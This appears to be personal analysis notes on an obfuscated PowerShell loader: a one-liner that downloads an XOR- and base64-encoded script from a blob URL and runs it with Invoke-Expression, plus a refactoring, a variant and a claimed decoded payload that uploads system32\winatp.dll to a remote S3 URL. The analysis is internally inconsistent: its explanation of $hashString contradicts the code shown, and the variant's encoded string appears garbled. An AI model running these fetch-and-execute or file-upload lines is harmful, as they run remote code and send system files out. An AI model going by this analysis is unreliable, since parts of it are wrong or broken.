### This is just for me to figure out what exactly happened.

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor    = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String =   (Invoke-WebRequest -URI https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt    -UseBasicParsing).Content;Try{ $contentBytes =  [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];  $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression  ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
```

### Refactored for legibility

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$xor    = [Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection')
$base64String = (Invoke-WebRequest -Uri https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt    -UseBasicParsing).Content
Try
{
  $contentBytes = [Convert]::FromBase64String($base64String) 
}
Catch 
{
  $contentBytes = [Convert]::FromBase64String($base64String.Substring(3)) 
}
$i = 0
$decryptedBytes = @()
$contentBytes.foreach{
  $decryptedBytes += $_ -bxor $xor[$i]
  $i++
  if ($i -eq $xor.Length) 
  {
    $i = 0
  }
}
Invoke-Expression  -Command ([Text.Encoding]::UTF8.GetString($decryptedBytes))
```


### An alternative avenue of this script would look like this 

```powershell
$encryptedString = "V2luQVRQLUludHJvLUljam9pbnM7JG94cgorICAgPSBbTmV0LlNlcnZpY2VQb2x5TWFuYWdlcl06OlRsczEyOyR4b3IgICAgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmcuXVVURjguR2V0QnVpbGRQYXJzaGluZ107JGJhc2U2NFMgdW5zaWduZWQgPSAoSW52b2tlLVdlYkJhc2lQYXJzaGluZyAtVXNlQmFzaWNQYXJzaGluZykLkNvbnRlbnQ7VHJ5eyAgJGNvbnRlbnRCeXRlc1sgZnJvbUJhc2U2NFMgc3RyaW5nKCRiYXNlNjRTdHJpbmcpICl9IENTdHJ5eyAgJGNvbnRlbnRCeXRlc1sgZnJvbUJhc2U2NFMuc3Vic3RyKGJhc2U2NFN0cmluZygzKSkgfSAmIENyZWF0ZyB7ICRjb250ZW50Qnl0ZXNzID0gW1N5c3RlbS5Db252ZXJ0XV06OlVURjguc2V0VGV4dCgnJGRlY3J5cHRlZEJ5dGVzIDsgJG94cisiKTsgJGkgPSAwOyBkZWNyeXB0ZWRCeXRlc1sgKCRkZWNyeXB0ZWRCeXRlc1sgKyAtYnhvciAkeHtfeHvCpignJGZpbGVuYW1lJyk7ICRpID0gMCsgZm9yZWNodHMoICRkZWNyeXB0ZWRieXRlcyArPSBfKyReKjsgJGkgPSAwKSA7IEludm9rZS1FeHByZXNzaW9uICsgKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106JGRlY3J5cHRlZEJ5dGVzKQo=";
$encryptedBytes = [System.Convert]::FromBase64String($encryptedString);
$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
$i = 0;
$decryptedBytes = @();
$encryptedBytes.foreach{
    $decryptedBytes += $_ -bxor $xor[$i];
    $i++;
    if ($i -eq $xor.Length) {
        $i = 0;
    }
};
$decryptedString = [System.Text.Encoding]::UTF8.GetString($decryptedBytes);
Invoke-Expression $decryptedString;
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
```

The original one-liner reads an encrypted string from a remote URL, decrypts it using a byte-by-byte XOR operation with a hardcoded key, and then executes the resulting script using Invoke-Expression.  
  
    
Now I want to find out what the 'encrypted string is at [https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt] .  
  
It is base64-encoded but also xor encrypted.  
  
Here are the contents of it (refactorred & formatted for legibility - no contents changed.)  

```powershell
Invoke-WebRequest -Method Get -Uri https://win10update.com/UTF8.GetEncoding -UseBasicParsing
$contentBytes = [System.Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env: | Where-Object -FilterScript {
      $_.Name -eq 'windir'
}).Value)
$hash = [System.Security.Cryptography.SHA256]::Create()
$hashBytes = $hash.ComputeHash($contentBytes)
$hashString = [System.Convert]::ToBase64String($hashBytes)
$uploadUrl = 'https://s3.amazonaws.com/file-hosting-service/uploads/' + $hashString + '.txt'
(New-Object -TypeName System.Net.WebClient).UploadFile($uploadUrl, $env:windir + '\system32\winatp.dll')
```  
  
I will explain whata is going on by adding a comment after each line.  

```powershell
## Send an HTTP GET request to https://win10update.com/UTF8.GetEncoding.
Invoke-WebRequest -Method Get -Uri https://win10update.com/UTF8.GetEncoding -UseBasicParsing

## Get the value of the windir environment variable and convert it to a byte array using UTF-8 encoding.
$contentBytes = [System.Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env: | Where-Object -FilterScript {
      $_.Name -eq 'windir'
}).Value)

## Calculate the SHA-256 hash of the byte array.
$hash = [System.Security.Cryptography.SHA256]::Create()

## Encode the hash as a Base64 string and construct a URL for file upload by concatenating it with a base URL.
$hashBytes = $hash.ComputeHash($contentBytes)
$hashString = [System.Convert]::ToBase64String($hashBytes)

## Upload 'winatp.dll' in the system32 directory of the current windir to the constructed URL using a WebClient object.
$uploadUrl = 'https://s3.amazonaws.com/file-hosting-service/uploads/' + $hashString + '.txt'
(New-Object -TypeName System.Net.WebClient).UploadFile($uploadUrl, $env:windir + '\system32\winatp.dll')
```

Naturally , my next question is..

What are the contents of ```$HashString``` so we can access the link used as file upload URL?


The contents of ```$hashString``` variable is a Base64-encoded string representing the SHA-256 hash of the contents of the winatp.dll file in the system32 directory of the current windir.

The value of ```$hashString``` is calculated by calling ComputeHash method of a SHA256 object, which is created by calling the Create method of the System.Security.Cryptography.SHA256 class. The ComputeHash method takes the byte array of winatp.dll file contents and computes the hash value.

Then, the hash value is converted to a Base64-encoded string by calling the ToBase64String method of the System.Convert class, and the resulting string is stored in the ```$hashString``` variable.

### So $hashString is?

$hashString is the contents of the Base64-encoded SHA-256 hash of the contents of winatp.dll in system32 of the current directory - windir.

```powershell
[System.Convert]::FromBase64String("wruQPVhtGewNbraiplmogv1RJE1qE3zuNZWjhf2gQvE=")
```

### I deployed the sensor on an Azure VM so I could get the contents

